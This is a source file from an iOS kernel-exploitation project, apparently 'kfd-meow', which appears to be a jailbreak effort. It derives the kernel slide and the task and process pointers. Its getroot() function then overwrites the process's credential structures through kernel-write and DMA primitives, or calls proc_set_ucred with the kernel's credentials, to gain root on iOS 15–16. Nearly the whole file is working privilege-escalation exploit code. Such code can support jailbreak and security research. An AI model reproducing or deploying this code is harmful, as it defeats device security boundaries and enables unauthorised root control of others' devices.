//
//  libmeow.m
//  kfd-meow
//
//  Created by doraaa on 2023/12/17.
//

#include "libmeow.h"

uint64_t kernel_base = 0;
uint64_t kernel_slide = 0;

uint64_t our_task = 0;
uint64_t our_proc = 0;
uint64_t kern_task = 0;
uint64_t kern_proc = 0;
uint64_t our_ucred = 0;
uint64_t kern_ucred = 0;

uint64_t gCpuTTEP = 0;
uint64_t gPhysBase = 0;
uint64_t gVirtBase = 0;

uint64_t data__gCpuTTEP = 0;
uint64_t data__gVirtBase = 0;
uint64_t data__gPhysBase = 0;

uint64_t add_x0_x0_0x40 = 0;
uint64_t proc_set_ucred = 0;
uint64_t container_init = 0;
uint64_t iogettargetand = 0;
uint64_t empty_kdata    = 0;
uint64_t mach_vm_alloc  = 0;

void set_offsets(void) {
    kernel_slide = get_kernel_slide();
    kernel_base = kernel_slide + KERNEL_BASE_ADDRESS;
    our_task = get_current_task();
    our_proc = get_current_proc();
    kern_task = get_kernel_task();
    kern_proc = get_kernel_proc();
    our_ucred = proc_get_ucred(our_proc);
    kern_ucred = proc_get_ucred(kern_proc);
    
    printf("kernel_slide : %016llx\n", kernel_slide);
    printf("kernel_base  : %016llx\n", kernel_base);
    printf("our_task     : %016llx\n", our_task);
    printf("our_proc     : %016llx\n", our_proc);
    printf("kern_task    : %016llx\n", kern_task);
    printf("kern_proc    : %016llx\n", kern_proc);
    printf("our_ucred    : %016llx\n", our_ucred);
    printf("kern_ucred   : %016llx\n", kern_ucred);
    
    offsetfinder64_kread();
}

/*---- proc ----*/
uint64_t proc_get_proc_ro(uint64_t proc_ptr) {
    if(isAvailable() >= 8)
        return kread64_kfd(proc_ptr + 0x18);
    return kread64_kfd(proc_ptr + 0x20);
}

uint64_t proc_ro_get_ucred(uint64_t proc_ro_ptr) {
    return kread64_kfd(proc_ro_ptr + 0x20);
}

uint64_t proc_get_ucred(uint64_t proc_ptr) {
    if(isAvailable() <= 3)
        return kread64_ptr_kfd(proc_ptr + off_proc_ucred);
    return proc_ro_get_ucred(proc_get_proc_ro(proc_ptr));
}
/*#========= PROGRESS =========
 *# kcall:    arm64  15.0 - 16.7
 *#           arm64e 15.0 - 15.7
 *# unsandbx: arm64  15.1 - 16.7 (untested 15.0-15.1)
 *#           arm64e
 *#============================
 */
void getroot(void) {
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    if(isAvailable() >= 4) {
        if(isarm64e()) {
            uint64_t cr_posix_p = our_ucred + 0x18;
            
            int *buf = malloc(0x60);
            for (int i = 0; i < 0x60; i++) {
                buf[i] = 0;
            }
            
            kreadbuf_kfd(kern_ucred + 0x18, buf, 0x60);
            hexdump(buf, 0x60);
            
            dma_perform(^{
                dma_writevirt32(our_proc + 0x2c, 0);
                dma_writevirt32(our_proc + 0x30, 0);
                dma_writevirt32(our_proc + 0x34, 0);
                dma_writevirt32(our_proc + 0x38, 0);
                dma_writevirtbuf(cr_posix_p, buf, 0x60);
            });
            free(buf);
        } else {
            eary_kcall(proc_set_ucred, our_proc, kern_ucred, 0, 0, 0, 0, 0);
            
            usleep(5000);
            setuid(0);
        }
    } else {
        if(isarm64e()) {
            uint64_t cr_posix_p = our_ucred + 0x18;
            
            kwrite64_kfd(cr_posix_p + 0, 0);
            kwrite64_kfd(cr_posix_p + 0x8, 0);
            kwrite64_kfd(cr_posix_p + 0x10, 0);
            kwrite64_kfd(cr_posix_p + 0x18, 0);
            kwrite64_kfd(cr_posix_p + 0x20, 0);
            kwrite64_kfd(cr_posix_p + 0x28, 0);
            kwrite64_kfd(cr_posix_p + 0x30, 0);
            kwrite64_kfd(cr_posix_p + 0x38, 0);
            kwrite64_kfd(cr_posix_p + 0x40, 0);
            kwrite64_kfd(cr_posix_p + 0x48, 0);
            kwrite64_kfd(cr_posix_p + 0x50, 0);
            kwrite64_kfd(cr_posix_p + 0x58, 0);
            
            setgroups(0, 0);
        } else {
            kwrite32_kfd(our_proc + off_p_uid, 0);
            kwrite32_kfd(our_proc + off_p_ruid, 0);
            kwrite32_kfd(our_proc + off_p_gid, 0);
            kwrite32_kfd(our_proc + off_p_rgid, 0);
            kwrite32_kfd(our_ucred + 0x18, 0);
            kwrite32_kfd(our_ucred + 0x1c, 0);
            kwrite32_kfd(our_ucred + 0x20, 0);
            kwrite32_kfd(our_ucred + 0x24, 1);
            kwrite32_kfd(our_ucred + 0x28, 0);
            kwrite32_kfd(our_ucred + 0x68, 0);
            kwrite32_kfd(our_ucred + 0x6c, 0);
        }
    }
    
    uint32_t t_flags_bak = kread32_kfd(our_task + off_task_t_flags);
    uint32_t t_flags = t_flags_bak | 0x00000400;
    kwrite32_kfd(our_task + off_task_t_flags, t_flags);
    
    printf("getuid() : %d\n", getuid());
    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    
    kwrite32_kfd(our_task + off_task_t_flags, t_flags_bak);
    if(isAvailable() >= 4 && !isarm64e()) {
        eary_kcall(proc_set_ucred, our_proc, our_ucred, 0, 0, 0, 0, 0);
        setuid(501);
    }
    
}

/*---- meow ----*/
int meow(void) {
    
    set_offsets();
    
    setup_client();
    
    getroot();
    
    Fugu15KPF();
    
    return 0;
}
